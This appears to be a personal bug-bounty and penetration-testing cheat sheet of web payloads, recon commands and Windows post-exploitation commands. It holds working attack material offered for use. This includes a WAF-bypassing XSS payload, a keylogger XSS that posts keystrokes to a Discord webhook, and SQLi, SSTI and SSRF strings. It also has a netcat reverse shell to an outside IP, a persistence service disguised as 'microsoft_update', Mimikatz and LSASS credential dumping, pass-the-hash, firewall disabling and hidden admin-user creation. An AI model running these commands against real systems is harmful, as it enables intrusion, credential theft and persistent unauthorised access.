  </body>
</html>
.................
[Bypass Cloudflare] Open Redirect to XSS 
Open Redirect
/login?redirectUrl=//evil.org --> redirect to evil,org
Escalate to XSS
/login?redirectUrl=javascript:alert(1) --> blocked by WAF
[1/2]
/login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain --> xss pop-up


for old browsers 
<![CDATA[<img src="broken" onerro"alert(1)">]]>
<![CDATA[><img src="broken" onerror="alert(1)">]]>


for old browsers 
<![CDATA[<img src="broken" onerro"alert(1)">]]>
<![CDATA[><img src="broken" onerror="alert(1)">]]>

/#__proto_[onload]=alert(11)


x-forwarded-host: a."><script>alert(1)</script>"

GET / HTTP/1.1
Host: example.com
Cookie: session:VIMoamgioofjami; fehost=hossam"%2balert(1)%2b"


<img src onerror='let x=!1,l="";document.onkeypress=function(a){l+=a.key,x=!0},setInterval(()=>{x&&(fetch("//discord.com/api/webhook/...",{method:"post",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:l})}),x=!1)},1e3);'>


Payloads to try on phone number input fields by @securinti


XSs +441134960000;phone-context=<script>alert(0)</script>

Parameter pollution (1) +441134960000;phone-context=&phone-context=+442..

Parameter pollution (2) +441134960000;ext=1;ext=?

 SQL injection +441134960000;phone-context=' OR 1=1; --

Template injection +441134960000;phone-context={{22}}[ [33]]{{77}}{% debug %} {77}{7*’7}

SSRF +441134960000;phone-context=http://burocoaborator.net


𝘽𝙡𝙞𝙣𝙙 𝙓𝙎𝙎 𝙈𝙖𝙨𝙨 𝙃𝙪𝙣𝙩𝙞𝙣𝙜

cat domain.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>"

https://seckrd.com/google-hacking.php
sitekey=";alert(0)//


for url in 200_url.txt ; do (python3 paramspider.py -d "${url}");done
cat filtered_url.txt | kxss	


------------------------------------------------------------
IDOR ::   API
  GO to my account and intercept data then change id 
  go to comments and intercept and change the id 
  go to my cart and intercept and change the id 
  
  
  DELETE /v1/api_tokens/hogamo-oamig-aojekm-fimao
  if you  can't find api token then go to 
  GET / v1/api_tokens/

Apache Traffic Server

 /#/../?r=javascript:alert(1)
/#/../?r=javascript:alert(1)


exploit api keys >>>>>>    https://github.com/streaak/keyhacks#Algolia-API-key

https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&key=fiojamiofmaofi   => to verify the google key => https://hackerone.com/reports/1065041


inurl:"/wp-json/wp/v2/users"Finds all publicly available
WordPress API user directories
intitle:"index.of" intext:"api.txt"Finds publicly available API
key files
inurl:"/includes/api/" intext:"index of /"Finds potentially interesting API
directories
ext:php inurl:"api.php?action="Finds all sites with a XenAPI SQL
injection vulnerability (This query
was posted in 2016; four years
later, there were 141,000 results.)
intitle:"index of" api_key OR "api key" OR
apiKey -pool

kierunner for api descover
$ kr scan http://192.168.195.132:8090 -w ~/api/wordlists/data/kiterunner/routes-large.kite



https://github.com/hAPI-hacker/Hacking-APIs     ==> all api wordlist 

wfuzz -d '{"email":"a@email.com","password":"FUZZ"}' --hc 405 -H 'Content-Type: application/
json' -z file,/home/hapihacker/rockyou.txt http://192.168.195.130:8888/api/v2/auth

https://github.com/hAPI-hacker/Hacking-APIs

inurl:"/api/v1" site:ex.com
intitle:"/api"
intitle:json

search on github
	api key exposed => and search in issues tab
	
	extension:json nasa
	shodan_api_key
	"authorization:Bearer"
	filename:swagger.json

search on shodan.io
	"content-type: application/json"
	"wp-json"

search on waybackmachine
	

inurl:"/api/v1" site:ex.com
intitle:"/api"
intitle:json

search on github
	api key exposed => and search in issues tab
	
	extension:json nasa
	shodan_api_key
	"authorization:Bearer"
	filename:swagger.json

search on shodan.io
	"content-type: application/json"
	"wp-json"

search on waybackmachine
1️⃣ Manually search for URLs, API endpoints, paths, and secrets in JS files. Automated tools struggle with obfuscated/minified JS code.

2️⃣ Extract Javascript sourcemaps and look for API endpoints, hardcoded API keys & secrets.

$ cat urls.txt | jsmap
$ gospider -q -s "https://google com" | jsmap -o srcmaps_google.com
$ cat domains.txt | waybackurls | jsmap
$ gau http://google.com | jsmap

3️⃣ Utilize Burp Suite's Param Miner extension to discover parameters in API endpoints.

4️⃣ Found a response containing sensitive information? Profit! 💰💸








----------------------------------------------------------------------------------------------

Directory listing::
        try every dir in debuging folders 
              http://example.com/assets
              https://example.com/app
              http://example.com/en

  
  
  ----------------------------------------------------------------------------------------------
  httpx -l hosts.txt -paths /root/login.txt -threads 50 -random-agent -x GET, POST -tech-detect -status-code -follow-redirects -title -content-lengthhttpx -l hosts.txt -ports 80,443,8009,8080,8081,8090,8180,8443 -paths /root/login.txt -threads 50 -random-agent -x GET, POST -tech-detect -status-code -follow-redirects -title -content-length
  
  
  Symfony Open Profiler

target[.]com/app_dev.php/_profiler/empty/search/results?limit=100

Symfony Web Debug Toolbar

target[.]com/app_dev.php/_fragment
----------------------------------------------------------------------------------------------




  shodan :: 
      ssl.cert.subject.cn:"website.com" http.title:"admin"
      ssl: "website.com" http.title: "admin"
      ssl.cert.subject.cn:"website.com" admin
      ssl: "website.com" admin
      
      
 Fofa :: 
      cert = "website.com" && title = "admin"
      cert.subject = "website.com" && title = "admin"
      cert = "website.com" && body = "admin"
      
 Censys:: 
       (services.tls.certificates.leaf_data.issuer.common_name: website.com) AND services.http.response.html_title: admin
       (services.tls.certificates.leaf_data.issuer.common_name: website.com) AND services.http.response.body: admin
       
       
       ---------------------------------------------------------------------------------------------------------
       
                                    NMAP
           
           nmap --script http-methods 192.168.1.1         >> to check the allowable methods 
           nmap --script http-enum 192.168.1.1        => enum important directoeies
       
       
       
       
       
       
       ---------------------------------------------------------------------------------------------------------------
                                              nuclei
nuclei -u "http://example.com" -t nuclei-templates  -tags xss 		>> to use all xss tags  	
nuclei -u "http://example.com" -t nuclei-templates  -author hossam 	>> for templates of hossam
nuclei -u "http://example.com" -t nuclei-templates -severity low,medium
nuclei -u "http://example.com" -t nuclei-templates -p http://127.0.0.1:8080     >> to send the request to burpsuite
nuclei -header "User-Agent:Mozilla(Hacktify_Hacker)"
nuclei -l subdomains.txt -t detect-all-takeovers.yaml     ==> https://gitcode.net/mirrors/projectdiscovery/nuclei-templates/-/blob/v7.0.2/subdomain-takeover/detect-all-takeovers.yaml
cat subdmains | nuclei -t nuclei-templates
nuclei -update

rate limit :: requests per second 
bulk-size :: requests parallel
c templates concurrent 
{{BaseURL}}	https://www.example.com:4444/test/example.txt
{{RootURL}}	https://www.example.com:4444
{{Hostname}}	www.example.com:4444
{{Host}}		www.example.com
{{Port}}		4444	
{{Path}}		/test
{{File}}		/example.txt
{{Scheme}}	Https      
  
  
  nuclei -t cve2023cpanelxss -l doamins => https://github.com/KingOfBugbounty/KingOfBugBountyTips/blob/master/OFJAAAH-cpanelXSS.yaml

  
  plugin ‘InQL — Introspection GraphQL Scanner’ and found interesting queries like users query
  
  ----------------------------------------------------------------------------------------------------------------------
                          TOOLS
  1- http secret and debug finder >> https://github.com/redhuntlabs/httploot                        
  2- httpx 
  3- subfinder 
  4- subbrute
  5- gobuster
  6- dirb
  7- dirsearch
  8- gau
  9- waybackurl 
  10- nuclei
  11- aquatone    >> for checking live and responsive sites 
  12- subjack 
  13- can i takeover xyz
  14- amass     amass enum -ip -src -brute -df domains -config config.ini
  14- echo 173.0.84.0/24 | dnsx -silent -resp-only -ptr		==> to see all subdomains accossiated to ips
  14- https://github.com/Micro0x00/CRTER 		==> for recon subdomains with cert.sh
  15- masdns 
  16- dnsgen    ==> for providing hidden subdomains     
  17- mksub ==> mksub -d exmaple.com -w wordlist.txt -1 2  >> great 
  18- hunter.how ==> site for searching site ==> via shodan 
  19- subfinder online ==> alternative for subfinder tool 
  20- ghauri ==> as sqlmap but more advanced techique 
  21- wfuzz -c -z file,/home/hosssam/file.txt --sc 200 "http://example.com/FUZZ" 
  22- to crack secret of jwt token::: => # hashcat  -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ   rockyou.txt --show

  23- apt install seclists => all lists of passwords
  24- put the request in file.txt and remove the place of password with FUZZ and =>
  #fuff -request file.txt -request-proto http -w /usr/share/seclists/password.txt ( -fc 403,401 ) or can filter the size -fs 8589
       
  25- sqlmap -r request.txt --ignore-code 401
  26- jwt_too -C -d rockyou.txt "jwtokennnnnnnnnnnnn.nnnnn.nnnn"
  27- ffuf -u https://example.com/v1/FUZZ -w /usr/share/wordlists/dirb/big.txt -e .php -recusrion 
  28- open burpsuite and send to intruder and $GET$ then select payloads from library => http verbs
       
  29 - gf patterns ==> git clone https://github.com/1ndianl33t/Gf-Patterns
            mkdir .gf
            mv ~/Gf-Patterns/*.json ~/.gf
  29- echo http://vulnweb.com | subfinder -silent | httpx -silent | katana -d 10 -silent | gf xss | Gxss -c 100 -p XssReflected | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
       
   30- cat iplist| httpx -silent -path /xmlrpc.php -title -match-string "XML-RPC" ==> then search exploit xmlrpc
    
    
    
Nmap Full Web Vulnerable Scan

cd /usr/share/nmap/scripts/
wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz && tar xzf nmap_nse_vulscan-2.0.tar.gz
nmap -sS -sV --script=vulscan/vulscan.nse target
nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target
nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target
nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target
nmap -sV --script=vuln target
nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target


Dirb Dir Bruteforce:

dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt

Nikto web server scanner

nikto -C all -h http://IP

WordPress Scanner

git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
./wpscan –url http://IP/ –enumerate p

HTTP Fingerprinting

wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
cd httprint_301/linux/
./httprint -h http://IP -s signatures.txt

SKIP Fish Scanner

skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP

Nmap Ports Scan

nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target ( Randomize scan form diff IP)
nmap -Pn -T2 -sV –randomize-hosts IP1,IP2
nmap –script smb-check-vulns.nse -p445 target (using NSE scripts)
nmap -sU -P0 -T Aggressive -p123 target (Aggresive Scan T1-T5)
nmap -sA -PN -sN target
nmap -sS -sV -T5 -F -A -O target (version detection)
nmap -sU -v target (Udp)
nmap -sU -P0 (Udp)
nmap -sC 192.168.31.10-12 (all scan default)

NC Scanning

nc -v -w 1 target -z 1-1000
for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done

Unicornscan

us -H -msf -Iv 192.168.56.101 -p 1-65535
us -H -mU -Iv 192.168.56.101 -p 1-65535

-H resolve hostnames during the reporting phase
-m scan mode (sf - tcp, U - udp)
-Iv - verbose

Xprobe2 OS fingerprinting

xprobe2 -v -p tcp:80:open IP

Samba Enumeration

nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target

SNMP Enumeration

snmpget -v 1 -c public IP
snmpwalk -v 1 -c public IP
snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP

Windows Useful cmds

net localgroup Users
net localgroup Administrators
search dir/s *.doc
system("start cmd.exe /k $cmd")
sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore
/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
Procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits
C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits

PuTTY Link tunnel

Forward remote port to local address
plink.exe -P 22 -l root -pw "1234" -R 445:127.0.0.1:445 IP

Meterpreter portfwd

# https://www.offensive-security.com/metasploit-unleashed/portfwd/
# forward remote port to local address
meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
kali > rdesktop 127.0.0.1:3389

Enable RDP Access

reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
netsh firewall set service remoteadmin enable
netsh firewall set service remotedesktop enable

Turn Off Windows Firewall

netsh firewall set opmode disable

Meterpreter VNC\RDP

run getgui -u admin -p 1234
run vnc -p 5043

Add New user in Windows

net user test 1234 /add
net localgroup administrators test /add

Mimikatz use

git clone https://github.com/gentilkiwi/mimikatz.git
privilege::debug
sekurlsa::logonPasswords full

Passing the Hash

git clone https://github.com/byt3bl33d3r/pth-toolkit
pth-winexe -U hash //IP cmd

or

apt-get install freerdp-x11
xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP

--------------------------
gather all links with katana , gospider , waybackurl , gau 
use anew to remove all dubpicates and put new line for every url 
       
       https://github.com/michenriksen/gitrob		==> to find senstive data in repositories github
       
       
       
